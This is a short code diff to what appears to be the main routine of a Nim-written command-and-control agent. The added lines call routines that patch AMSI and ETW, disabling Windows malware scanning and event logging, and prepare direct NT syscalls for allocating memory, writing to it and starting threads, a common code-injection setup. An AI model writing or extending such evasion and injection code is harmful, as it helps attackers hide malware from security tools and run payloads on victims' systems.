@@ -2,6 +2,11 @@ import os, json, strformat
 import utils, comms, config
 
 proc main() =
+  discard PatchAMSI()
+  discard PathETW()
+  makeNtAllocateVirtualMemory()
+  makeNtWriteVirtualMemory()
+  makeNtCreateThreadEx()
   randomize()
 
   let agentID = genID()
